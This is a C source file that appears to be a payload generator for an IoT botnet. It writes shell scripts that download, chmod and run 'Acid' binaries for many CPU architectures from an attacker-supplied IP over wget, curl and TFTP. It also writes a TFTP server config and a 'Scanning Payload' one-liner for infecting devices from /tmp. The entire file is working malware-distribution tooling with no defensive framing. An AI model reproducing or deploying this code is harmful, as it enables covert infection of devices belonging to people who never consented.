#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **args)
{
	if (argc < 2)
	{
		printf("usage: %s ip\n", args[0]);
		return 0;
	}

	char *bins[] = {"arm", "arm5", "arm6", "arm7", "m68k", "mips", "mpsl", "ppc", "sh4", "spc", "x86"};

	FILE *wget = fopen("wget.sh", "w"), *curl = fopen("curl.sh", "w"), *tftp = fopen("tftp.sh", "w"), *payload = fopen("Payload.txt", "w"), *xinetd = fopen("/etc/xinetd.d/tftp", "w");

	fprintf(xinetd, "service tftp\n{\nprotocol = udp\nport = 69\nsocket_type = dgram\nwait = yes\nuser = nobody\nserver = /usr/sbin/in.tftpd\nserver_args = /tftpboot\ndisable = no\n}\n");
	fclose(xinetd);

	fprintf(wget, "#!/bin/sh\n");
	fprintf(curl, "#!/bin/sh\n");
	fprintf(tftp, "#!/bin/sh\n");

	for (int i = 0; i < 11; i++)
	{
		fprintf(wget, "rm -rf Acid.%dwget;wget http://%s/Acid.%s -O Acid.%dwget;chmod 777 Acid.%dwget;./Acid.%dwget %s.wget;rm -rf Acid.%dwget;\n", i, args[1], bins[i], i, i, i, bins[i], i);
		fprintf(curl, "rm -rf Acid.%dcurl;curl http://%s/Acid.%s -o Acid.%dcurl;chmod 777 Acid.%dcurl;./Acid.%dcurl %s.curl;rm -rf Acid.%dcurl;\n", i, args[1], bins[i], i, i, i, bins[i], i);
		fprintf(tftp, "rm -rf Acid.%dtftp;tftp -g %s -r Acid.%s -l Acid.%dtftp;chmod 777 Acid.%dtftp;./Acid.%dtftp %s.tftp;rm -rf Acid.%dtftp;\n", i, args[1], bins[i], i, i, i, bins[i], i);
	}

	fclose(wget);
	fclose(curl);
	fclose(tftp);

	fprintf(payload, "Scanning Payload: cd /tmp || cd /var/tmp || cd /var/run;rm -rf wget.sh;wget http://%s/wget.sh;chmod 777 wget.sh;sh wget.sh;rm -rf wget.sh;rm -rf curl.sh;curl -O http://%s/curl.sh;chmod 777 curl.sh;sh curl.sh;rm -rf curl.sh;rm -rf tftp.sh;tftp -g %s -r tftp.sh;chmod 777 tftp.sh;sh tftp.sh;rm -rf tftp.sh;\n", args[1], args[1], args[1]);
	fclose(payload);

	printf("Payload's Stored Into Payload.txt | wget.sh, curl.sh, And tftp.sh Were Created\n");
	return 0;
}
